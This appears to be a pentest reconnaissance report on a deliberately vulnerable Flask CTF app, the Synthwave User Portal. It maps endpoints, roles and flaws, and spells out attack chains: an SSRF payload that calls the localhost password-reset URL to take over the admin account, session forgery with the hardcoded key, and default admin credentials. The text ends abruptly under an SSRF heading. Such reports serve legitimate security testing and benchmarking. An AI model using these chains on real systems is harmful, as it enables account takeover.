# Reconnaissance Deliverable: Synthwave User Portal

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

The target application is a Flask-based web application called "Synthwave User Portal" running on Python 3.8.20 with Werkzeug/3.0.6. This is a traditional monolithic server-side rendered web application exposed on HTTP port 37053 (mapped from internal port 80). The application implements basic user registration, authentication, and profile management functionality with a retro "Synthwave" aesthetic theme.

**Core Technology Stack:**
- **Backend:** Python 3.8.20, Flask 3.0.3, Werkzeug 3.0.6
- **Frontend:** Server-side rendered Jinja2 templates with custom CSS
- **Data Storage:** In-memory Python dictionary (no persistent database)
- **Session Management:** Flask signed cookies with hardcoded secret key
- **Deployment:** Docker container, HTTP only (no HTTPS)

**Primary Attack Surface Components:**
The application exposes 6 network-accessible HTTP endpoints: 3 public endpoints for registration, login, and redirect logic; 2 authenticated endpoints for profile management and logout; and 1 localhost-restricted password reset endpoint. The profile endpoint contains a critical SSRF vulnerability via the profile picture URL upload feature that can be chained with the localhost-only password reset endpoint to achieve admin account takeover.

**Critical Security Finding:**
The application has a **CRITICAL Server-Side Request Forgery (SSRF) vulnerability** in the profile picture URL fetcher (`app.py:97`) that accepts arbitrary URLs without validation. This can be exploited to bypass IP-based access controls and make requests to the localhost-only password reset endpoint (`/reset_password`), enabling any authenticated user to reset the admin password, login as admin, and access privileged functionality. Additional critical vulnerabilities include hardcoded credentials (`admin:adminpass`), a weak hardcoded session secret key (`supersecretkey`), plaintext password storage, and complete absence of CSRF protection across all state-changing operations.

**Architecture Pattern:**
Single-file Flask application (122 lines) with no microservices, no API layer, no database persistence, and no background processing. All authentication, authorization, business logic, and rendering occur in a single Python process within a Docker container.

## 2. Technology & Service Map

### Frontend
- **Framework:** Server-side rendered Jinja2 templates (Flask's default templating engine)
- **Styling:** Custom CSS (`static/style.css`) with Synthwave/Vaporwave aesthetic (pink/purple gradient backgrounds, retro fonts)
- **JavaScript:** None - No client-side JavaScript framework or libraries
- **Forms:** Standard HTML forms with POST submission (no AJAX)
- **Templates:** 4 Jinja2 templates - `base.html` (shared layout), `login.html`, `register.html`, `profile.html`

### Backend
- **Language:** Python 3.8.20
- **Framework:** Flask 3.0.3
- **WSGI Server:** Werkzeug 3.0.6 (Flask's development server, running in production mode with `debug=False`)
- **Key Dependencies (from `requirements.txt`):** 
  - Flask==3.0.3 (only external dependency)
  - Transitive: Werkzeug, Jinja2, Click, ItsDangerous, Blinker
- **Session Management:** Flask's default `SecureCookieSessionInterface` (client-side signed cookies)
- **File Upload Handling:** Werkzeug's `secure_filename()` for sanitization, native Python file operations
- **HTTP Client:** `urllib.request` (standard library) for profile picture URL fetching

### Infrastructure
- **Hosting:** Docker container (`python:3.8-slim` base image)
- **Orchestration:** Docker Compose (`docker-compose.yml`)
- **Port Mapping:** External port 37053 → Container port 80
- **Protocol:** HTTP only (no HTTPS/TLS)
- **Database:** None - In-memory Python dictionary storage only
- **CDN:** None (application-level), Google Fonts CDN referenced in CSS for typography
- **Reverse Proxy:** None detected (application exposed directly)
- **Load Balancer:** None (single container)

### Identified Subdomains
From subfinder scan (pre-reconnaissance deliverable):
- mail.regency.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- naeu2.naeuinc.localhost
- autodiscover.localhost
- mail02.regency.localhost
- www.localhost
- server02.counterintel.localhost
- fndlync01.5ninesdata.localhost
- mail.localhost
- mse-ca-mail.corp.mse.localhost
- autodiscover.regency.localhost
- mail03.regency.localhost
- tools.sonoma.edu.localhost
- exchvm.nwcnet.localhost

**Note:** These subdomains appear to be from external DNS enumeration and are not directly related to the target application at localhost:37053. No subdomain routing is configured in the application.

### Open Ports & Services
From nmap scan (targeting localhost):
- **Port 80/tcp:** Caddy httpd (HTTP server)
- **Port 443/tcp:** SSL/HTTPS (no title/service detected)
- **Port 631/tcp:** CUPS 2.3 (printing service - out of scope)
- **Port 4444/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) with exposed .git repository
- **Port 9998/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) with exposed .git repository
- **Port 9999/tcp:** Unknown service with CORS headers
- **Port 49152/tcp:** Golang net/http server (Tailscale daemon, requires auth)
- **Port 37053/tcp:** Target application (Flask/Werkzeug) - **PRIMARY TARGET**

**Target Application Service:**
- **Port:** 37053 (external) → 80 (container)
- **Server:** Werkzeug/3.0.6 Python/3.8.20
- **Initial Redirect:** HTTP 302 redirect from `/` to `/login`
- **Title:** "Synthwave User Portal"

## 3. Authentication & Session Management Flow

### Entry Points
- **`/register` (GET/POST):** User registration with username, password, first name, last name, email
- **`/login` (GET/POST):** User authentication with username and password
- **`/logout` (GET):** Session termination
- **`/reset_password` (GET):** Password reset endpoint (localhost-restricted, accessible via SSRF)

### Mechanism

#### Registration Process (Step-by-Step)
1. **User visits** `/register` (GET request)
2. **Server renders** registration form (`register.html`)
3. **User submits** form with credentials (POST to `/register`)
4. **Server validates** username uniqueness: `if username in users:` (`app.py:41`)
5. **If unique**, server creates user object with plaintext password: `users[username] = {'username': username, 'password': password, ...}` (`app.py:44-50`)
6. **Server redirects** to `/login` with flash message "Registration successful!"
7. **No email verification**, no CAPTCHA, no rate limiting

#### Login Process (Step-by-Step)
1. **User visits** `/login` (GET request)
2. **Server renders** login form (`login.html`)
3. **User submits** credentials (POST to `/login`)
4. **Server validates** credentials via plaintext comparison: `if username in users and users[username]['password'] == password:` (`app.py:61`)
5. **If valid**, server creates session: `session['username'] = username` (`app.py:62`)
6. **Server generates** signed session cookie using `itsdangerous` library with secret key `'supersecretkey'`
7. **Server sets cookie** in HTTP response: `Set-Cookie: session=<signed_payload>; HttpOnly; Path=/`
8. **Server redirects** to `/profile`

#### Session Cookie Format
```
session=eyJ1c2VybmFtZSI6InRlc3R1c2VyIn0.ZyQxMA.ABC123...
        └────────┬────────┘ └──┬──┘ └──┬──┘
         payload (base64)  timestamp signature (HMAC-SHA1)
```

**Session Cookie Characteristics:**
- **Storage:** Client-side (signed cookie, not encrypted)
- **Signing Algorithm:** HMAC-SHA1 via `itsdangerous.URLSafeTimedSerializer`
- **Secret Key:** `'supersecretkey'` (hardcoded at `app.py:7`)
- **Data Stored:** `{'username': '<username>'}` (only username, no role data)
- **Expiration:** Browser session (non-permanent, expires on browser close)
- **Security Flags:** 
  - HttpOnly: True (default, prevents JavaScript access)
  - Secure: False (allows transmission over HTTP)
  - SameSite: None (no CSRF protection)

#### Session Validation (Per Request)
1. **User makes request** to authenticated endpoint (e.g., `/profile`)
2. **Browser sends** session cookie in `Cookie` header
3. **Flask deserializes** and validates HMAC signature
4. **If valid**, Flask populates `session` object with `{'username': '<username>'}`
5. **Application checks** session presence: `if 'username' not in session:` (`app.py:75`)
6. **If present**, retrieves username: `username = session['username']` (`app.py:78`)
7. **Application accesses** user data: `user = users[username]` (`app.py:79`)

#### Logout Process
1. **User clicks** logout link (`/logout` GET request)
2. **Server removes** username from session: `session.pop('username', None)` (`app.py:70`)
3. **Server redirects** to `/login`
4. **Session cookie remains** in browser but with empty data (no server-side invalidation)

#### Password Reset Process (Localhost-Only)
1. **Request made** to `/reset_password?username=<user>&newpassword=<pass>` (GET request)
2. **Server checks** IP address: `if request.remote_addr != '127.0.0.1': return "Unauthorized", 403` (`app.py:106-107`)
3. **If localhost**, server validates username exists: `if username in users:` (`app.py:112`)
4. **Server updates** password in plaintext: `users[username]['password'] = new_password` (`app.py:113`)
5. **Server returns** HTTP 200 with message "Password reset successfully"
6. **No authentication required**, no email notification, no audit logging

### Code Pointers

**Authentication Logic:**
- **User Storage:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py` lines 11-20 (in-memory dictionary)
- **Registration Handler:** `app.py` lines 33-54 (`register()` function)
- **Login Handler:** `app.py` lines 56-66 (`login()` function)
- **Logout Handler:** `app.py` lines 68-71 (`logout()` function)
- **Password Reset Handler:** `app.py` lines 104-116 (`reset_password()` function)

**Session Management:**
- **Secret Key Configuration:** `app.py` line 7 (`app.secret_key = 'supersecretkey'`)
- **Session Creation:** `app.py` line 62 (`session['username'] = username`)
- **Session Validation:** `app.py` line 75 (`if 'username' not in session:`)
- **Session Termination:** `app.py` line 70 (`session.pop('username', None)`)

**Template Files:**
- **Login Form:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/templates/login.html`
- **Registration Form:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/templates/register.html`
- **Profile Page:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/templates/profile.html`
- **Base Layout:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/templates/base.html`

### 3.1 Role Assignment Process

**Role Determination:**
The application does not have a formal role-based access control (RBAC) system with explicit role attributes. Instead, it uses **implicit privilege differentiation** based on username comparison:

- **Admin Privilege Check:** `flag=FLAG if username == 'admin' else None` (`app.py:102`)
- **Role Storage:** No role field in user objects; privileges determined at runtime by comparing session username
- **Role Logic:** If `session['username'] == 'admin'`, user has admin privileges (access to FLAG)

**Default Role:**
All newly registered users are regular users with no special privileges. There is no default role field set during registration - users are differentiated only by their username.

**Role Upgrade Path:**
No legitimate role upgrade mechanism exists. The only way to become admin is to:
1. Register with username `'admin'` (blocked - default admin already exists at `app.py:12-19`)
2. Exploit SSRF vulnerability to reset admin password and authenticate as admin
3. Forge session cookie with username `'admin'` using known secret key

**Code Implementation:**
- **Privilege Check:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py` line 102
- **Default Admin User:** `app.py` lines 11-20 (hardcoded in initial `users` dictionary)

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary:** In-memory Python dictionary (`users = {}` at `app.py:11`)
- **Session:** Only username stored in session (`session['username']`), no explicit role/privilege data
- **No Database:** All user data lost on application restart

**Validation Points:**
- **Session Presence Check:** `app.py:75` in `profile()` function - `if 'username' not in session:`
- **Admin Privilege Check:** `app.py:102` in `profile()` function - `flag=FLAG if username == 'admin' else None`
- **IP-Based Validation:** `app.py:106-107` in `reset_password()` function - `if request.remote_addr != '127.0.0.1':`

**Cache/Session Persistence:**
- **Session Duration:** Browser session (non-permanent, expires on browser close)
- **Session Refresh:** Flask's default `SESSION_REFRESH_EACH_REQUEST = True` extends session on every request
- **No Timeout:** Sessions do not expire based on time, only on browser close or explicit logout
- **No Session Database:** All session data in client-side signed cookie

**Code Pointers:**
- **User Data Storage:** `app.py:11-20` (users dictionary)
- **Session Username Storage:** `app.py:62` (login function)
- **Privilege Validation:** `app.py:102` (profile function, admin check)

### 3.3 Role Switching & Impersonation

**Impersonation Features:**
No legitimate admin impersonation features exist in the application.

**Role Switching:**
No temporary privilege elevation mechanisms exist (no "sudo mode" or similar features).

**Audit Trail:**
No logging, monitoring, or audit trail for authentication events, privilege checks, or administrative actions.

**Code Implementation:**
Not applicable - no impersonation/role switching features implemented.

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed below are accessible through the target web application at `http://localhost:37053`. No local-only utilities, build tools, or CLI applications are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None (redirect logic) | Index/root endpoint. Redirects authenticated users to `/profile`, unauthenticated users to `/login`. Code: `app.py:27-31` |
| GET | `/register` | anon | None | None | Renders user registration form with fields for username, password, first name, last name, email. Code: `app.py:33-54` |
| POST | `/register` | anon | None | None | Processes registration form, creates new user in `users` dictionary with plaintext password storage. No validation beyond username uniqueness check. Code: `app.py:36-53` |
| GET | `/login` | anon | None | None | Renders login form with username and password fields. Code: `app.py:56-66` |
| POST | `/login` | anon | None | None (establishes session) | Authenticates user via plaintext password comparison, creates session cookie with username. Code: `app.py:59-65` |
| GET | `/logout` | anon (no check) | None | None | Removes username from session, redirects to login. Vulnerable to CSRF (GET-based state change). Code: `app.py:68-71` |
| GET | `/profile` | user (session required) | None | Session check: `'username' not in session` | Renders user profile page with user data (name, email, profile picture) and FLAG for admin users. Code: `app.py:73-102` (GET logic at lines 75-79) |
| POST | `/profile` | user (session required) | None | Session check + implicit ownership | Updates user profile data (first name, last name, email, profile picture). Contains SSRF vulnerability via `profile_picture_url` parameter. Code: `app.py:80-100` |
| GET | `/reset_password` | localhost only | `username` (query param) | IP-based: `request.remote_addr == '127.0.0.1'` | Resets password for specified username. Accepts `username` and `newpassword` query parameters. **CRITICAL:** Bypassable via SSRF in `/profile` endpoint. Code: `app.py:104-116` |

**Authorization Summary:**
- **Public Endpoints (3):** `/`, `/register`, `/login` - No authentication required
- **Authenticated Endpoints (2):** `/profile` (GET/POST), `/logout` - Require session with username
- **Privileged Endpoints (1):** `/reset_password` - Restricted to localhost IP (bypassable via SSRF)
- **Admin-Only Data (1):** FLAG display in `/profile` - Shown only when `username == 'admin'` (line 102)

**SSRF Attack Chain:**
```
1. Authenticate as regular user → POST /profile
2. Set profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked
3. Server makes request to localhost (bypasses IP check)
4. Admin password changed to "hacked"
5. Logout → Login as admin:hacked
6. Access FLAG at /profile
```

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors listed below are accessible through the target web application's network interface at `http://localhost:37053`. No local-only scripts, build tools, or CLI applications are included.

### URL Parameters (Query Strings)
- **`/reset_password?username=<value>`** - `app.py:109` - `username = request.args.get('username')`
- **`/reset_password?newpassword=<value>`** - `app.py:110` - `new_password = request.args.get('newpassword')`

### POST Body Fields (Form Data)

**Registration Endpoint (`/register` POST):**
- **`username`** - `app.py:36` - `username = request.form['username']` - No validation
- **`password`** - `app.py:37` - `password = request.form['password']` - No validation, stored in plaintext
- **`first_name`** - `app.py:38` - `first_name = request.form['first_name']` - No validation
- **`last_name`** - `app.py:39` - `last_name = request.form['last_name']` - No validation
- **`email`** - `app.py:40` - `email = request.form['email']` - No server-side validation (HTML5 client-side only)

**Login Endpoint (`/login` POST):**
- **`username`** - `app.py:59` - `username = request.form['username']` - No validation
- **`password`** - `app.py:60` - `password = request.form['password']` - No validation

**Profile Endpoint (`/profile` POST):**
- **`first_name`** - `app.py:82` - `user['first_name'] = request.form['first_name']` - No validation, stored XSS risk
- **`last_name`** - `app.py:83` - `user['last_name'] = request.form['last_name']` - No validation, stored XSS risk
- **`email`** - `app.py:84` - `user['email'] = request.form['email']` - No validation, stored XSS risk
- **`profile_picture_url`** - `app.py:93` - `profile_picture_url = request.form.get('profile_picture_url')` - **CRITICAL SSRF: No URL validation**

### File Uploads
- **`profile_picture`** (file upload) - `app.py:86-91` - `file = request.files['profile_picture']`
  - Validation: Extension check only (`allowed_file()` at line 88)
  - Sanitization: `secure_filename()` at line 89
  - Allowed extensions: png, jpg, jpeg, gif (configured at line 9)
  - No file size limit, no content validation, no virus scanning

### HTTP Headers
- **`request.remote_addr`** - `app.py:106` - Used for IP-based authorization in `/reset_password`
  - Reads the client IP address from WSGI environment
  - Vulnerable to proxy header manipulation if reverse proxy is added
  - Currently accessed directly (no X-Forwarded-For handling)

### Cookie Values
- **`session`** cookie - Flask session management
  - Read via Flask's session interface (automatic deserialization)
  - Contains: `{'username': '<username>'}`
  - Signed with secret key `'supersecretkey'` (hardcoded at `app.py:7`)
  - Vulnerable to session forgery if secret key is known

### Session Data
- **`session['username']`** - `app.py:78` - `username = session['username']`
  - Used for user identification and authorization
  - Retrieved after session validation at line 75
  - No additional validation after retrieval
  - Direct dictionary lookup: `user = users[username]` at line 79

## 6. Network & Interaction Map

**Network Surface Focus:** This map includes only the deployed, network-accessible infrastructure components. Local development environments, build systems, and local-only tools are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| SynthwavePortal | Service | App | Flask 3.0.3/Python 3.8 | PII, Tokens | Main application backend, single container |
| UserBrowser | ExternAsset | Internet | Web Browser | None | External attacker's browser |
| DockerHost | Service | Edge | Docker Engine | None | Container runtime hosting application |
| InMemoryStore | DataStore | App | Python Dict | PII, Tokens | Volatile user data storage (no persistence) |
| StaticAssets | Service | App | Werkzeug Static Files | Public | CSS and uploaded profile pictures |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| SynthwavePortal | Hosts: `http://localhost:37053`; Endpoints: `/`, `/register`, `/login`, `/logout`, `/profile`, `/reset_password`; Auth: Flask Session Cookie; Dependencies: InMemoryStore, StaticAssets; Secret: `supersecretkey` (hardcoded); Storage: Volatile in-memory |
| UserBrowser | Access: Public internet; Protocols: HTTP; Auth: Session cookie; Origin: External untrusted |
| DockerHost | Container: `xben-024-24_app`; Base Image: `python:3.8-slim`; Exposed Port: 37053→80; Network: Bridge mode; Health Check: `curl -f http://127.0.0.1/` every 10s |
| InMemoryStore | Type: Python Dictionary; Persistence: None (ephemeral); Location: `app.py:11` variable `users`; Access: Global scope; Encryption: None; Backup: None |
| StaticAssets | Directory: `/app/static/`; Upload Path: `/app/static/uploads/`; Served At: `/static/*`; Validation: Extension-only for uploads; Access: Public read |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| UserBrowser → SynthwavePortal | HTTP | `:37053 /register` | None | Public |
| UserBrowser → SynthwavePortal | HTTP | `:37053 /login` | None | PII (credentials) |
| UserBrowser → SynthwavePortal | HTTP | `:37053 /profile` | auth:user | PII, Tokens |
| UserBrowser → SynthwavePortal | HTTP | `:37053 /logout` | None (weak) | Tokens |
| SynthwavePortal → InMemoryStore | Memory | Direct variable access | None | PII, Tokens |
| SynthwavePortal → StaticAssets | File | `/app/static/uploads/` | auth:user | User files |
| SynthwavePortal → SynthwavePortal | HTTP | `127.0.0.1:80 /reset_password` | auth:localhost | PII (via SSRF) |
| SynthwavePortal → ExternalURL | HTTP | Arbitrary (SSRF) | auth:user | None (outbound SSRF) |
| UserBrowser → StaticAssets | HTTP | `:37053 /static/*` | None | Public files |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:user | Auth | Requires valid Flask session cookie with `username` key. Validated via `'username' not in session` check at `app.py:75`. |
| auth:admin | Authorization | Requires session username to equal `'admin'`. Checked at `app.py:102` for FLAG display: `if username == 'admin'`. |
| auth:localhost | Network | Requires request to originate from 127.0.0.1 IP address. Checked at `app.py:106-107`: `if request.remote_addr != '127.0.0.1'`. **Bypassable via SSRF**. |
| ownership:user | ObjectOwnership | Implicit ownership via session username. Users access their own data via `user = users[session['username']]` at `app.py:79`. No explicit ownership validation. |
| file:extension | Input | File upload extension validation. Requires extension in whitelist: `{'png', 'jpg', 'jpeg', 'gif'}`. Implemented via `allowed_file()` at `app.py:24-25`. **No content validation**. |
| session:signed | Protocol | Session cookie integrity protected by HMAC-SHA1 signature using secret key `'supersecretkey'`. Signature validation handled by Flask's `itsdangerous` library. **Forgeable with known key**. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anon | 0 | Global | No authentication required. Implicit role for unauthenticated requests. |
| user | 1 | Global | Base authenticated user role. Requires session with username. Session check at `app.py:75`. |
| admin | 5 | Global | Privileged user with FLAG access. Determined by username comparison: `username == 'admin'` at `app.py:102`. Default admin account hardcoded at `app.py:12-19` with credentials `admin:adminpass`. |
| localhost | 10 (context) | Network | Special privilege context based on IP address. Can reset any user's password. IP check at `app.py:106-107`. **Not a user role** but a network-based authorization context. |

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon → user → admin

Special Contexts:
localhost (IP-based) → admin (can reset admin password)

Dominance Rules:
- admin dominates user (has all user capabilities + FLAG access)
- user dominates anon (has all public access + authenticated features)
- localhost context can affect admin (via password reset)

No Parallel Isolation:
All users exist in a single namespace with no tenant separation, 
no organizational boundaries, and no departmental isolation.
```

**Critical Authorization Weakness:** The privilege model has only one authorization decision point (`username == 'admin'`) and one IP-based restriction (`remote_addr == '127.0.0.1'`). The IP restriction is bypassable via SSRF, creating a privilege escalation path from regular user to admin.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/login` | `/`, `/login`, `/register` | None |
| user | `/profile` | `/`, `/login`, `/register`, `/logout`, `/profile` | Session cookie with username |
| admin | `/profile` (with FLAG) | All user routes + FLAG display in `/profile` | Session cookie with `username='admin'` |
| localhost | N/A (IP context) | `/reset_password` | IP address == 127.0.0.1 |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | None | N/A |
| user | Session check at `app.py:75` | `'username' not in session` → redirect to login | Session cookie (client-side signed) |
| admin | Session check at `app.py:75` + admin check at `app.py:102` | `username == 'admin'` for FLAG display | Default user in `users` dict at `app.py:12-19`, session username must equal `'admin'` |
| localhost | IP check at `app.py:106-107` | `request.remote_addr != '127.0.0.1'` → HTTP 403 | WSGI environment variable `REMOTE_ADDR` |

**Role Assignment Code Locations:**
- **Default Admin Creation:** `app.py:11-20` - Hardcoded in initial `users` dictionary
- **User Creation (Registration):** `app.py:44-50` - New users added to `users` dictionary
- **Session Assignment (Login):** `app.py:62` - `session['username'] = username`
- **Role Validation (Admin Check):** `app.py:102` - `flag=FLAG if username == 'admin' else None`

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**High Priority:**

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Vulnerability Description |
|----------|------------------|---------------------|-----------|-------------|--------------------------|
| HIGH | `/profile` (POST) | Implicit via `session['username']` | user_data | User PII (name, email, profile picture) | **Indirect IDOR via session manipulation.** If session cookie can be forged (weak secret key `'supersecretkey'`), attacker can create session for any username and modify that user's profile. Code: `app.py:78-79` - `username = session['username']; user = users[username]`. |
| MEDIUM | `/reset_password` (GET) | `username` (query param) | credentials | Admin password | **Direct IDOR with IP-based protection.** Accepts arbitrary `username` parameter to reset any user's password. Protected by localhost IP check (`app.py:106-107`), but bypassable via SSRF at `app.py:97`. Attack chain: SSRF → localhost request → password reset for any user. |

**Note:** Traditional IDOR vulnerabilities are limited due to implicit ownership via session username. However, the weak session secret key (`'supersecretkey'`) enables session forgery, effectively creating IDOR opportunities by allowing attackers to impersonate any user.

**Low Priority:**
None additional - The application's authorization model relies entirely on session username, so there are no additional object ID parameters in endpoints that could lead to horizontal privilege escalation beyond the session manipulation attack vector.

### 8.2 Vertical Privilege Escalation Candidates

**Endpoints Requiring Higher Privileges:**

| Target Role | Endpoint Pattern | Functionality | Risk Level | Vulnerability Description |
|-------------|------------------|---------------|------------|--------------------------|
| admin | `/profile` (FLAG display) | Retrieves CTF flag | HIGH | **Weak admin check:** Only checks `username == 'admin'` at `app.py:102`. Exploitable via: (1) Session forgery with known secret key to create admin session, or (2) SSRF chain to reset admin password, login as admin. |
| localhost | `/reset_password` (GET) | Password reset for any user | CRITICAL | **IP-based authorization bypass via SSRF.** Endpoint restricted to `127.0.0.1` at `app.py:106-107`, but SSRF vulnerability at `app.py:97` allows authenticated users to make requests from localhost context, bypassing IP restriction. |

**Privilege Escalation Attack Paths:**

**Path 1: Session Forgery → Admin Access**
```
1. Obtain secret key: 'supersecretkey' (hardcoded at app.py:7)
2. Forge Flask session cookie with {'username': 'admin'}
3. Set forged cookie in browser
4. Access /profile to retrieve FLAG
Time: <5 minutes, Requires: Known secret key
```

**Path 2: SSRF → Password Reset → Admin Login**
```
1. Register normal user account via /register
2. Login as normal user
3. POST to /profile with profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked
4. Server makes request to localhost (bypasses IP check)
5. Admin password changed to "hacked"
6. Logout and login as admin:hacked
7. Access /profile to retrieve FLAG
Time: <10 minutes, Requires: Valid user account
```

**Path 3: Default Credentials → Direct Admin Access**
```
1. Attempt login with admin:adminpass (default credentials)
2. If unchanged, immediate admin access
3. Access /profile to retrieve FLAG
Time: <1 minute, Requires: Default credentials unchanged
```

### 8.3 Context-Based Authorization Candidates

**Multi-step Workflow Endpoints:**

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Vulnerability Description |
|----------|----------|---------------------|------------------|--------------------------|
| Authentication | `/profile` (GET/POST) | Login via `/login` | MEDIUM | **Session-based state validation only.** Application checks `'username' not in session` at `app.py:75`. Bypass via session forgery (known secret key). No additional validation of authentication method, no session binding to IP/User-Agent. |
| Password Reset | `/reset_password` (GET) | Request from localhost IP | HIGH | **Network location assumption.** Application assumes only localhost can make requests to this endpoint (`app.py:106-107`). Bypass via SSRF vulnerability allows remote attacker to make requests from localhost context. No authentication token, no email verification, no secondary confirmation. |
| File Upload | `/profile` (POST with file) | Authenticated session | LOW | **Extension-only validation.** Application assumes file extension indicates file type (`app.py:88`). No content validation, no magic byte checks. `secure_filename()` used but no file size limits. |
| Profile Update | `/profile` (POST) | Authenticated session with ownership | MEDIUM | **Implicit ownership via session username.** No explicit ownership validation beyond session check. If session can be manipulated (weak secret key), attacker can update any user's profile. Code: `app.py:78-84`. |

**No Multi-Step Form Workflows:**
The application does not implement complex multi-step forms (wizards, checkout processes, onboarding flows) that would require state validation between steps. All forms are single-page submissions.

**No Workflow State Machines:**
The application has no explicit workflow state management (e.g., order status, approval workflows, document lifecycle states) that could be bypassed by skipping intermediate states.

## 9. Injection Sources (Command Injection and SQL Injection)

### Command Injection Sources

**Status:** No command injection sources found in network-accessible code.

**Analysis:**
The Flask application at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-024-24/app/app.py` was analyzed for command execution sinks. The following functions/modules were searched:

- **`os.system()`** - NOT FOUND
- **`subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`** - NOT FOUND (subprocess module not imported)
- **`os.popen()`** - NOT FOUND
- **`eval()` with shell commands** - NOT FOUND
- **`exec()`** - NOT FOUND

**`os` Module Usage (All Instances):**
1. **Line 90:** `file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))` - Path concatenation only, no command execution
2. **Line 97:** `urllib.request.urlretrieve(profile_picture_url, os.path.join(app.config['UPLOAD_FOLDER'], filename))` - Path concatenation only, no command execution
3. **Line 119:** `if not os.path.exists(app.config['UPLOAD_FOLDER']):` - Directory existence check, no user input
4. **Line 120:** `os.makedirs(app.config['UPLOAD_FOLDER'])` - Directory creation with static config value, no user input

**SSRF is NOT Command Injection:**
While the application has an SSRF vulnerability at `app.py:97` via `urllib.request.urlretrieve(profile_picture_url, ...)`, this is a Server-Side Request Forgery vulnerability, not command injection. The function performs HTTP requests, not shell command execution.

### SQL Injection Sources

**Status:** No SQL injection sources found in network-accessible code.

**Analysis:**
The application does **NOT use a SQL database**. All data is stored in an in-memory Python dictionary (`users = {}` at line 11).

**Database Technology Check:**
- **No SQL database imports:** sqlite3, psycopg2, pymysql, mysql.connector - NONE IMPORTED
- **No ORM imports:** SQLAlchemy, Django ORM, Peewee - NONE IMPORTED
- **No database connection strings or configuration**

**Data Storage Mechanism:**
All user data is stored in a Python dictionary with the following structure:
```python
users = {
    'admin': {
        'username': 'admin',
        'password': 'adminpass',
        'first_name': 'Admin',
        'last_name': 'User',
        'email': 'admin@example.com',
        'profile_picture': None
    }
    # Additional users added via registration
}
```

**Data Access Patterns (All Non-SQL):**
1. **User Lookup:** `if username in users:` (`app.py:41, 61, 112`) - Dictionary membership test
2. **User Retrieval:** `user = users[username]` (`app.py:79`) - Dictionary key access
3. **User Creation:** `users[username] = {...}` (`app.py:44-50`) - Dictionary assignment
4. **User Update:** `user['first_name'] = request.form['first_name']` (`app.py:82-84`) - Dictionary value update
5. **Password Update:** `users[username]['password'] = new_password` (`app.py:113`) - Dictionary value update

**No SQL Query Functions:**
- **`cursor.execute()`** - NOT FOUND
- **`executemany()`** - NOT FOUND
- **Raw SQL strings (SELECT, INSERT, UPDATE, DELETE)** - NOT FOUND
- **ORM query methods** - NOT FOUND

**Conclusion:**
No SQL injection vulnerabilities exist because the application does not interact with a SQL database. All data operations use Python dictionary methods, which are not susceptible to SQL injection.

### Additional Injection Analysis

**Server-Side Template Injection (SSTI):**
The application uses Jinja2 templating with safe practices:
- **Template rendering:** `render_template('profile.html', user=user, ...)` (`app.py:54, 66, 102`)
- **No dynamic template compilation:** `render_template_string()` NOT USED
- **Auto-escaping enabled:** Jinja2 auto-escaping is enabled by default in Flask
- **No unsafe filters:** `| safe` filter NOT USED in templates
- **Verdict:** No SSTI vulnerabilities detected

**XSS (Cross-Site Scripting):**
While XSS is not an injection source by the definition provided (command/SQL injection only), it's worth noting:
- **Stored XSS potential:** User input (first_name, last_name, email) rendered in templates
- **Mitigation:** Jinja2 auto-escaping provides protection
- **Template locations:** `profile.html` lines 6, 8, 10 (render user data in HTML attributes)

## 10. Additional Findings

### SSRF (Server-Side Request Forgery) - CRITICAL

